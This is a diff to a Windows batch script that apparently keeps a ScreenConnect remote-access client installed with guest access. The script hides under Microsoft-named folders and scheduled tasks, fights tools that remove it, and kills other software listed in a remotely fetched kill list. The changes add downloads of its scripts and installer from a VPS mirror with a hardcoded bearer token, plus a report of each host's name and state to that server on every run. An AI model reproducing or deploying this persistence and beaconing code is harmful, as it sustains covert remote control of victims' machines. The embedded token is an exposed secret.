@@ -41,12 +41,19 @@ rem   third-re-armer management; one-way fleet digest (Telegram, fire-and-forget
 rem   state changes + daily heartbeat - ABSENCE is the wipe signal); shadow learning (kill-scene
 rem   snapshots of non-Windows-path code correlated in suspects.db, REPORT ONLY - promotion to
 rem   action happens via human/AI review -> winrtcs_killlist.cfg, never by the machine).
+rem 0.1.4: VPS era (C20). All repo fetches go dual-URL (VPS mirror primary via HTTPS+bearer,
+rem   GitHub fallback); Digest no longer touches Telegram - it POSTs state to the VPS report
+rem   service every run and the SERVER decides what reaches Telegram (state changes, siege,
+rem   silence). The bot token leaves the repo and lives only on the VPS.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
 set "KL=%ZD%\killlist.cfg"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
+set "BASE2=https://debian.seczio.com/winrtcs"
+set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
+set "REPORT=https://debian.seczio.com/report"
 set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "LOG=%ZD%\guard.log"
 set "STREAKF=%ZD%\fight.cnt"
@@ -59,10 +66,6 @@ set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
 set "TASKS=\WinRTCSSentinel"
 set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
 set "SACT=cmd.exe /c C:\ProgramData\Microsoft\WinRTCS\cache\winrtcs_sentinel.cmd"
-set "NCFG=%ZD%\notify.cfg"
-set "DGF=%ZD%\digest.cfg"
-set "DSTATE=%ZD%\digest.state"
-set "DHB=%ZD%\digest.hb"
 set "SUSDB=%ZD%\suspects.db"
 set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
@@ -242,7 +245,7 @@ goto :DoInstall
 :RepoFetch
 set "SRC=repo"
 echo [%DATE% %TIME%] fetch_repo_fallback>>"%LOG%"
-"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 180 -o "%MSI%" "%BASE%/pkg_gryxa.msi?t=%RANDOM%%RANDOM%" >nul 2>&1
+call :Fetch2 pkg_gryxa.msi "%MSI%"
 if not exist "%MSI%" ( echo [%DATE% %TIME%] FAIL_no_msi_source>>"%LOG%" & goto :Done )
 for %%F in ("%MSI%") do if %%~zF LSS 5000000 ( echo [%DATE% %TIME%] FAIL_msi_small>>"%LOG%" & del /f /q "%MSI%" >nul 2>&1 & goto :Done )
 
@@ -443,7 +446,7 @@ if not exist "%ZD%\winrtcs_run.cmd" (
   if exist "%CD%\winrtcs_run.cmd" copy /y "%CD%\winrtcs_run.cmd" "%ZD%\winrtcs_run.cmd" >nul 2>&1
 )
 if not exist "%ZD%\winrtcs_run.cmd" (
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%ZD%\run.dl" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  call :Fetch2 winrtcs_run.cmd "%ZD%\run.dl"
   if exist "%ZD%\run.dl" findstr /C:"WINRTCS_RUN" "%ZD%\run.dl" >nul 2>&1 && move /y "%ZD%\run.dl" "%ZD%\winrtcs_run.cmd" >nul 2>&1
   del /f /q "%ZD%\run.dl" >nul 2>&1
 )
@@ -452,14 +455,13 @@ if not exist "%ZD%\winrtcs_agent.cmd" (
   if exist "%CD%\winrtcs_agent.cmd" copy /y "%CD%\winrtcs_agent.cmd" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
 )
 if not exist "%ZD%\winrtcs_agent.cmd" (
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 25 -o "%ZD%\agent.dl" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  call :Fetch2 winrtcs_agent.cmd "%ZD%\agent.dl"
   if exist "%ZD%\agent.dl" findstr /C:"WINRTCS_AGENT" "%ZD%\agent.dl" >nul 2>&1 && move /y "%ZD%\agent.dl" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
   del /f /q "%ZD%\agent.dl" >nul 2>&1
 )
 if not exist "%CD%\winrtcs_sentinel.cmd" (
   set "SIEGE=!SIEGE!sentinel_file,"
-  del /f /q "%CD%\sentinel.dl" >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%CD%\sentinel.dl" "%BASE%/winrtcs_sentinel.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  call :Fetch2 winrtcs_sentinel.cmd "%CD%\sentinel.dl"
   if exist "%CD%\sentinel.dl" findstr /C:"WINRTCS_SENTINEL" "%CD%\sentinel.dl" >nul 2>&1 && move /y "%CD%\sentinel.dl" "%CD%\winrtcs_sentinel.cmd" >nul 2>&1
   del /f /q "%CD%\sentinel.dl" >nul 2>&1
 )
@@ -496,71 +498,36 @@ if exist "%ZD%\suspects.top" (
 exit /b 0
 
 :Digest
-rem --- one-way fleet digest (C19): status OUT, nothing IN. Fire-and-forget (detached curl,
-rem --- hard 8s cap) so a blocked/slow network can never stall the health loop. Precedence:
-rem --- local notify.cfg (operator-seeded) overrides repo digest.cfg. No config = silent off. ---
-set "DENA="
-set "DTOK="
-set "DCHAT="
-set "NCFGTOK="
-set "NCFGENA="
-if exist "%DGF%" for /f "usebackq tokens=1,* delims==" %%K in ("%DGF%") do (
-  if /I "%%K"=="ENABLED" set "DENA=%%L"
-  if /I "%%K"=="BOT_TOKEN" set "DTOK=%%L"
-  if /I "%%K"=="CHAT_ID" set "DCHAT=%%L"
-)
-if exist "%NCFG%" (
-  for /f "usebackq tokens=1,* delims==" %%K in ("%NCFG%") do (
-    if /I "%%K"=="ENABLED" ( set "DENA=%%L" & set "NCFGENA=1" )
-    if /I "%%K"=="BOT_TOKEN" ( set "DTOK=%%L" & set "NCFGTOK=1" )
-    if /I "%%K"=="CHAT_ID" set "DCHAT=%%L"
-  )
-)
-if defined NCFGTOK if not defined NCFGENA set "DENA=1"
-if not defined DENA exit /b 0
-if /I "!DENA!"=="0" exit /b 0
-if not defined DTOK exit /b 0
-if not defined DCHAT exit /b 0
-set "SEND="
-set "OLDSTATE="
-if exist "%DSTATE%" set /p "OLDSTATE=" <"%DSTATE%"
-if /I not "!OLDSTATE!"=="!GSTATE!" set "SEND=1"
-set "HBD="
-if exist "%DHB%" set /p "HBD=" <"%DHB%"
-if not "!HBD!"=="%DATE%" set "SEND=1"
-if defined SIEGE_ACT (
-  set "SLAST="
-  if exist "%ZD%\siege.last" set /p "SLAST=" <"%ZD%\siege.last"
-  if /I not "!SLAST!"=="!SIEGE!" (
-    echo !SIEGE!>"%ZD%\siege.last"
-    set "SEND=1"
-  )
-)
-if not defined SEND exit /b 0
-echo !GSTATE!>"%DSTATE%"
-echo %DATE%>"%DHB%"
-set "MSG=[WINRTCS] host=%COMPUTERNAME% state=!GSTATE! guard=0.1.3 streak=!STREAK! extkill=!EXTK!"
-if defined SIEGE_ACT set "MSG=!MSG! siege=!SIEGE!"
-if defined SUSREP if /I not "!SUSREP!"=="none" set "MSG=!MSG! suspects=!SUSREP!"
-start "" /min "%CURL%" -s -L --ssl-no-revoke --connect-timeout 4 --max-time 8 "https://api.telegram.org/bot!DTOK!/sendMessage" --data-urlencode "chat_id=!DCHAT!" --data-urlencode "text=!MSG!" >nul 2>&1
+rem --- fleet report (C20): POST state to the VPS every guard run. Fire-and-forget
+rem --- (detached curl, hard 8s cap) so a blocked/slow network can never stall the health
+rem --- loop. The server holds the Telegram token and decides what reaches the chat:
+rem --- state changes, siege, silence. One-way as ever: status OUT, nothing IN. ---
+if not defined TOK exit /b 0
+set "DSUS=none"
+if defined SUSREP if /I not "!SUSREP!"=="" set "DSUS=!SUSREP!"
+set "DSIEGE="
+if defined SIEGE_ACT set "DSIEGE=!SIEGE!"
+start "" /min "%CURL%" -s -o nul --ssl-no-revoke --connect-timeout 4 --max-time 8 -X POST -H "Authorization: Bearer %TOK%" --data-urlencode "host=%COMPUTERNAME%" --data-urlencode "state=!GSTATE!" --data-urlencode "streak=!STREAK!" --data-urlencode "extkill=!EXTK!" --data-urlencode "guard=0.1.4" --data-urlencode "siege=!DSIEGE!" --data-urlencode "suspects=!DSUS!" "%REPORT%" >nul 2>&1
+exit /b 0
+
+:Fetch2
+rem %1 = repo-relative filename, %2 = destination. VPS mirror first (HTTPS + bearer,
+rem Cloudflare-fronted), GitHub raw fallback. Success = non-trivial file landed; callers
+rem do their own marker validation of content.
+del /f /q "%~2" >nul 2>&1
+if defined TOK "%CURL%" -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 30 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
 exit /b 0
 
 :FetchKL
-rem --- kill list + digest config are data: fresh copy from repo wins, cached copy otherwise ---
+rem --- kill list is data: fresh copy from the repo wins, cached copy otherwise ---
 set "KLNEW=%ZD%\killlist.new"
-del /f /q "%KLNEW%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%KLNEW%" "%BASE%/winrtcs_killlist.cfg?t=%RANDOM%%RANDOM%" >nul 2>&1
+call :Fetch2 winrtcs_killlist.cfg "%KLNEW%"
 if exist "%KLNEW%" (
   findstr /C:"WINRTCS_KILLLIST" "%KLNEW%" >nul 2>&1 && move /y "%KLNEW%" "%KL%" >nul 2>&1
 )
 del /f /q "%KLNEW%" >nul 2>&1
-set "DNEW=%ZD%\digest.new"
-del /f /q "%DNEW%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%DNEW%" "%BASE%/winrtcs_digest.cfg?t=%RANDOM%%RANDOM%" >nul 2>&1
-if exist "%DNEW%" (
-  findstr /C:"WINRTCS_DIGEST" "%DNEW%" >nul 2>&1 && move /y "%DNEW%" "%DGF%" >nul 2>&1
-)
-del /f /q "%DNEW%" >nul 2>&1
 exit /b 0
 
 :HuntKiller
